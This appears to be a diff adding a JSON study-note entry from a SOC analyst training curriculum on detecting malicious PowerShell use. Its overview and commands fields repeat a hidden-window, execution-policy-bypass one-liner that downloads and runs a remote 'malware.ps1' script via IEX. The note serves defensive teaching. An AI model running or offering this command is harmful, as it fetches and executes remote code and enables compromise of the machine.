@@ -1,0 +1,102 @@
+{
+  "id": "powershell detection",
+  "title": "Powershell Detection",
+  "slug": "powershell-detection",
+  "relPath": "Powershell Detection.md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-scripting-tooling",
+  "curriculumSectionTitle": "Advanced Scripting & Analysis Tooling",
+  "tags": [
+    "PowerShell",
+    "Windows",
+    "Web",
+    "Detection",
+    "Persistence",
+    "Lateral Movement",
+    "C2"
+  ],
+  "mitre": [],
+  "parentId": null,
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [],
+  "breadcrumbs": [
+    {
+      "id": "powershell detection",
+      "title": "Powershell Detection",
+      "slug": "powershell-detection"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Powershell Detection"
+    },
+    {
+      "level": 3,
+      "text": "PowerShell commands and objectives"
+    },
+    {
+      "level": 2,
+      "text": "Key PowerShell Event IDs"
+    },
+    {
+      "level": 3,
+      "text": "PowerShell Script Block Logging (Event ID 4104)"
+    },
+    {
+      "level": 3,
+      "text": "Reconstructing PowerShell Scripts from Logs"
+    },
+    {
+      "level": 3,
+      "text": "Additional PowerShell Execution Logging Features"
+    },
+    {
+      "level": 3,
+      "text": "Suspicious PowerShell Commands & Cmdlets"
+    },
+    {
+      "level": 3,
+      "text": "Example of Fileless PowerShell Malware"
+    },
+    {
+      "level": 3,
+      "text": "Enabling PowerShell Script Block Logging via Group Policy"
+    }
+  ],
+  "overview": "| Objective | Command | Explanation | | --- | --- | --- | | Execution | powershell -w hidden -ep bypass -nop -c \"IEX ((New-Object System.Net.Webclient).DownloadString('http://soctest.xyz/malware.ps1'))\" | -w hidden (Hides the command window) -ep bypass (Bypasses execution policy) -nop (Prevents PowerShell from loading user profiles) -c (Executes the command ",
+  "study": {
+    "overview": "| Objective | Command | Explanation | | --- | --- | --- | | Execution | powershell -w hidden -ep bypass -nop -c \"IEX ((New-Object System.Net.Webclient).DownloadString('http://soctest.xyz/malware.ps1'))\" | -w hidden (Hides the command window) -ep bypass (Bypasses execution policy) -nop (Prevents PowerShell from loading user profiles) -c (Executes the command ",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Powershell Detection",
+      "PowerShell commands and objectives",
+      "Key PowerShell Event IDs",
+      "PowerShell Script Block Logging (Event ID 4104)",
+      "Reconstructing PowerShell Scripts from Logs",
+      "Additional PowerShell Execution Logging Features",
+      "Suspicious PowerShell Commands & Cmdlets",
+      "Example of Fileless PowerShell Malware",
+      "Enabling PowerShell Script Block Logging via Group Policy"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [
+      {
+        "language": "powershell",
+        "code": "powershell.exe -ep bypass -nop -noexit -c iex ((New-Object Net.WebClient).DownloadString('http://soctest.xyz/malware.ps1'))"
+      }
+    ],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": []
+  }
+}
